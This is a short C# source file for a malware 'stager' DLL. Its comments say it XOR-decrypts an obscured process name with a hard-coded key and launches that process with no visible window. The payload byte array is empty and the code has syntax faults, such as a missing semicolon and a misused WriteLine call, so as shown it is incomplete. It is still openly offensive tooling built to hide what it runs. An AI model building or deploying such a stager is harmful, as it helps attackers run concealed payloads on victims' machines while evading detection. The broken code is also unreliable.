using System;
using System.Diagnostics;

namespace Stage
{
    //dll that has the namespace and the function that our stager needs to execute 
    public class StageEntry
    {
        //xor decryption function
		public static string XORCipher(byte[] data, string key)
		{
			int dataLen = data.Length;
			int keyLen = key.Length;
			char[] output = new char[dataLen];

			for (int i = 0; i < dataLen; ++i)
			{
				output[i] = (char)(data[i] ^ key[i % keyLen]);
			}

			return new string(output);
		}

		public static void Execute()
		{ 
            //xored process to spawn in the machine
            byte[] text = {}
            //key
            string key = "KALAPIGEAUTO";
			string plainText = XORCipher(text, key);
			Process Kala = new Process();
            //here we start our xored decrypted process
			Kala.StartInfo.FileName = plainText;
			Kala.StartInfo.CreateNoWindow = true;
			Kala.StartInfo.UseShellExecute = false;
			Console.WriteLine("Loading Stager...");
            //here we start our process
			Console.WriteLine("Stager Loaded",Kala.Start());
		}
    }
}
